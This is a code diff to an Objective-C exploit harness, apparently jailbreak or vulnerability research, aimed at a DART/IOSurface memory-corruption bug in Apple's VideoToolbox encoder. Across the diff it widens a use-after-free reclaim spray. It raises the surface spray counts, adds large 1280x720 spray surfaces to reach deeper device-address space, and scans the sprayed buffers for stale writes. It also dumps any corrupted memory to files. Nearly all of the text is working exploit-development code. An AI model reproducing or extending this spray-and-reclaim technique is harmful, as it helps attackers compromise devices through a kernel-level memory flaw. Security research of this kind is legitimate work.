@@ -5389,6 +5389,29 @@ static VTCompressionSessionRef exp3CreateSession(
     return exp3CreateSessionEx(callback, 320, 240, setAlpha255);
 }
 
+static CVPixelBufferRef exp3CreatePixelBufferEx(int w, int h, uint8_t yFill, uint8_t uvFill) {
+    CVPixelBufferRef pb = NULL;
+    OSStatus status = CVPixelBufferCreate(kCFAllocatorDefault, w, h,
+        kCVPixelFormatType_420YpCbCr8BiPlanarFullRange,
+        (__bridge CFDictionaryRef)@{
+            (NSString *)kCVPixelBufferIOSurfacePropertiesKey: @{}
+        }, &pb);
+    if (status != noErr || !pb) return NULL;
+
+    if (jbLockPB(pb, 0)) {
+        void *y = CVPixelBufferGetBaseAddressOfPlane(pb, 0);
+        if (y) memset(y, yFill,
+            CVPixelBufferGetBytesPerRowOfPlane(pb, 0) *
+            CVPixelBufferGetHeightOfPlane(pb, 0));
+        void *uv = CVPixelBufferGetBaseAddressOfPlane(pb, 1);
+        if (uv) memset(uv, uvFill,
+            CVPixelBufferGetBytesPerRowOfPlane(pb, 1) *
+            CVPixelBufferGetHeightOfPlane(pb, 1));
+        CVPixelBufferUnlockBaseAddress(pb, 0);
+    }
+    return pb;
+}
+
 static CVPixelBufferRef exp3CreatePixelBuffer(uint8_t yFill, uint8_t uvFill) {
     CVPixelBufferRef pb = NULL;
     OSStatus status = CVPixelBufferCreate(kCFAllocatorDefault, 320, 240,
@@ -6176,10 +6199,11 @@ static void runExp5_PivotalFork(void) {
 //  (b) Bitstream diff — captures encode output for corruption analysis
 // ============================================================
 
-#define S1_SPRAY_COUNT      20
+#define S1_SPRAY_COUNT      48
 #define S1_SPRAY_FRAMES      3
+#define S1_SPRAY_LARGE_COUNT 8
 #define S1_SOAK_SECS       300
-#define S1_MAX_SURFACES     64
+#define S1_MAX_SURFACES     80
 #define S1_RESPAWN_WAIT      5
 
 static volatile BOOL g_s1Running = NO;
@@ -6269,6 +6293,12 @@ static void runStage1_DartRead(void) {
     s1Mark([NSString stringWithFormat:@"P1-armed-%@", armedTS]);
     PASS(@"ARMED: -17691 confirmed at %@", armedTS);
     os_log(sLog, "STAGE1 P1 armed=YES");
+
+    IOSurfaceRef armSurf = CVPixelBufferGetIOSurface(armPB);
+    uint32_t armSurfID = armSurf ? IOSurfaceGetID(armSurf) : 0;
+    size_t armAllocSz = armSurf ? IOSurfaceGetAllocSize(armSurf) : 0;
+    INFO(@"Arm IOSurface: ID=%u alloc=%zu", armSurfID, armAllocSz);
+    os_log(sLog, "STAGE1 P1 arm_surf_id=%u arm_alloc=%zu", armSurfID, armAllocSz);
 
     // ---- PHASE 2: FREE ----
     s1Mark(@"P2-free-start");
@@ -6389,6 +6419,71 @@ static void runStage1_DartRead(void) {
         return;
     }
 
+    // Log DVA coverage: IOSurface IDs and alloc sizes from spray
+    size_t totalDVACoverage = 0;
+    for (int i = 0; i < sprayOK; i++) {
+        IOSurfaceRef ref = CVPixelBufferGetIOSurface(sprayPBs[i]);
+        if (ref) {
+            uint32_t sid = IOSurfaceGetID(ref);
+            size_t sz = IOSurfaceGetAllocSize(ref);
+            totalDVACoverage += sz;
+            if (i < 5 || (i + 1) % 10 == 0) {
+                INFO(@"  Spray[%d] IOSurface ID=%u alloc=%zu", i, sid, sz);
+            }
+        }
+    }
+    INFO(@"Total spray DVA coverage (input surfaces): %zu bytes (%.1f MB)",
+         totalDVACoverage, totalDVACoverage / (1024.0 * 1024.0));
+    os_log(sLog, "STAGE1 P4 dva_coverage=%zu", totalDVACoverage);
+
+    // Phase 4b: Large-surface spray for deeper DVA coverage
+    // The stale write may target DVAs deeper in the pool than small 320x240
+    // surfaces can reach. Larger surfaces cover more DVA address space.
+    LOG(@"");
+    LOG(@"═══ PHASE 4b: LARGE-SURFACE SPRAY (%d × 1280x720) ═══", S1_SPRAY_LARGE_COUNT);
+
+    VTCompressionSessionRef largeSessions[S1_SPRAY_LARGE_COUNT];
+    CVPixelBufferRef largePBs[S1_SPRAY_LARGE_COUNT];
+    int largeOK = 0;
+
+    for (int i = 0; i < S1_SPRAY_LARGE_COUNT; i++) {
+        largeSessions[i] = NULL;
+        largePBs[i] = NULL;
+
+        VTCompressionSessionRef ls = exp3CreateSessionEx(
+            (void *)exp3CollectCallback, 1280, 720, NO);
+        if (!ls) continue;
+
+        VTCompressionSessionPrepareToEncodeFrames(ls);
+        CVPixelBufferRef lpb = exp3CreatePixelBufferEx(1280, 720, 0xA0, 0x80);
+        if (!lpb) { VTCompressionSessionInvalidate(ls); CFRelease(ls); continue; }
+
+        BOOL encOK = NO;
+        for (int f = 0; f < 2; f++) {
+            CMTime pts = CMTimeMake(f, 30);
+            OSStatus es = VTCompressionSessionEncodeFrame(ls, lpb,
+                pts, kCMTimeInvalid, NULL, NULL, NULL);
+            if (es == noErr) encOK = YES;
+        }
+
+        if (encOK) {
+            VTCompressionSessionCompleteFrames(ls, kCMTimeInvalid);
+            largeSessions[largeOK] = ls;
+            largePBs[largeOK] = lpb;
+            IOSurfaceRef lref = CVPixelBufferGetIOSurface(lpb);
+            size_t lsz = lref ? IOSurfaceGetAllocSize(lref) : 0;
+            totalDVACoverage += lsz;
+            largeOK++;
+        } else {
+            VTCompressionSessionInvalidate(ls); CFRelease(ls);
+            CVPixelBufferRelease(lpb);
+        }
+    }
+    PASS(@"Large spray: %d/%d sessions encoded", largeOK, S1_SPRAY_LARGE_COUNT);
+    INFO(@"Total DVA coverage now: %zu bytes (%.1f MB)",
+         totalDVACoverage, totalDVACoverage / (1024.0 * 1024.0));
+    os_log(sLog, "STAGE1 P4b large=%d dva_total=%zu", largeOK, totalDVACoverage);
+
     // Store baseline bitstream checksums for corruption detection
     NSMutableArray *baselineBitstreams = [NSMutableArray array];
     for (int i = 0; i < samplesFromSpray; i++) {
@@ -6455,6 +6550,12 @@ static void runStage1_DartRead(void) {
         for (int i = 0; i < sprayOK; i++) {
             IOSurfaceRef ref = CVPixelBufferGetIOSurface(sprayPBs[i]);
             if (ref && IOSurfaceGetID(ref) == sid) { isSprayInput = YES; break; }
+        }
+        if (!isSprayInput) {
+            for (int i = 0; i < largeOK; i++) {
+                IOSurfaceRef ref = CVPixelBufferGetIOSurface(largePBs[i]);
+                if (ref && IOSurfaceGetID(ref) == sid) { isSprayInput = YES; break; }
+            }
         }
         if (isSprayInput) continue;
 
@@ -6628,8 +6729,48 @@ static void runStage1_DartRead(void) {
             IOSurfaceUnlock(extraSurfs[si], kIOSurfaceLockReadOnly, NULL);
         }
 
+        // Channel C: diff large spray PBs
+        for (int i = 0; i < largeOK; i++) {
+            if (!largePBs[i]) continue;
+            if (!jbLockPB(largePBs[i], kCVPixelBufferLock_ReadOnly)) continue;
+            uint8_t *lY = (uint8_t *)CVPixelBufferGetBaseAddressOfPlane(largePBs[i], 0);
+            size_t lH = CVPixelBufferGetHeightOfPlane(largePBs[i], 0);
+            size_t lBPR = CVPixelBufferGetBytesPerRowOfPlane(largePBs[i], 0);
+            size_t lTotal = lH * lBPR;
+
+            if (lY) {
+                int lDiffs = 0;
+                int lFirst = -1;
+                size_t checkSz = MIN(lTotal, 1024*1024);
+                for (size_t b = 0; b < checkSz; b++) {
+                    if (lY[b] != 0xA0) {
+                        if (lDiffs == 0) lFirst = (int)b;
+                        lDiffs++;
+                    }
+                }
+                if (lDiffs > 0) {
+                    hitCount++;
+                    if (firstHitTime < 0) firstHitTime = elapsed;
+                    PASS(@"*** LARGE SPRAY HIT: session %d at T+%ds ***", i, elapsed);
+                    LOG(@"  %d bytes changed in first %zu, first at 0x%x", lDiffs, checkSz, lFirst);
+                    os_log(sLog, "STAGE1 LARGE-HIT session=%d T+%d diffs=%d first=0x%x",
+                           i, elapsed, lDiffs, lFirst);
+
+                    NSData *dumpData = [NSData dataWithBytes:lY length:lTotal];
+                    NSString *dumpPath = [NSHomeDirectory()
+                        stringByAppendingPathComponent:
+                        [NSString stringWithFormat:@"Documents/s1_hit_large%d_T%d.bin", i, elapsed]];
+                    [dumpData writeToFile:dumpPath atomically:YES];
+                    LOG(@"  Full dump: %@ (%zu bytes)", dumpPath, lTotal);
+                    if (!hitDump) hitDump = dumpPath;
+                }
+            }
+            CVPixelBufferUnlockBaseAddress(largePBs[i], kCVPixelBufferLock_ReadOnly);
+        }
+
         if (hitCount == 0 && (elapsed <= 30 || elapsed % 30 == 0)) {
-            INFO(@"T+%03ds (%@): no change (%d sprays + %d extras)", elapsed, now, sprayOK, extraCount);
+            INFO(@"T+%03ds (%@): no change (%d sprays + %d large + %d extras)",
+                 elapsed, now, sprayOK, largeOK, extraCount);
         }
 
         if (tick % 12 == 0) {
@@ -6667,17 +6808,20 @@ static void runStage1_DartRead(void) {
 
     // Write result summary
     NSString *resultStr = [NSString stringWithFormat:
-        @"STAGE 1 (DART Re-claim Read)\n"
+        @"STAGE 1 v2 (DART Re-claim Read)\n"
         @"Date: %@\n"
-        @"Spray sessions: %d (encoded: %d)\n"
+        @"Spray sessions: %d (encoded: %d) + %d large (1280x720)\n"
+        @"DVA coverage: %zu bytes (%.1f MB)\n"
         @"Extra IOSurfaces: %d\n"
         @"Bitstream samples: %d\n"
         @"Soak survived: T+%ds\n"
         @"Hits: %d (first at T+%ds)\n"
-        @"Hit dump: %@\n",
-        [NSDate date], sprayOK, sprayEncoded, extraCount,
-        samplesFromSpray, finalElapsed, hitCount, firstHitTime,
-        hitDump ?: @"(none)"];
+        @"Hit dump: %@\n"
+        @"Arm IOSurface: ID=%u alloc=%zu\n",
+        [NSDate date], sprayOK, sprayEncoded, largeOK,
+        totalDVACoverage, totalDVACoverage / (1024.0 * 1024.0),
+        extraCount, samplesFromSpray, finalElapsed, hitCount, firstHitTime,
+        hitDump ?: @"(none)", armSurfID, armAllocSz];
     NSString *resultPath = [NSHomeDirectory()
         stringByAppendingPathComponent:@"Documents/s1_result.txt"];
     [resultStr writeToFile:resultPath atomically:YES
@@ -6691,6 +6835,13 @@ static void runStage1_DartRead(void) {
         }
         if (sprayPBs[i]) CVPixelBufferRelease(sprayPBs[i]);
         if (spraySnapshots[i]) free(spraySnapshots[i]);
+    }
+    for (int i = 0; i < largeOK; i++) {
+        if (largeSessions[i]) {
+            VTCompressionSessionInvalidate(largeSessions[i]);
+            CFRelease(largeSessions[i]);
+        }
+        if (largePBs[i]) CVPixelBufferRelease(largePBs[i]);
     }
     for (int i = 0; i < extraCount; i++) {
         if (extraSnaps[i]) free(extraSnaps[i]);
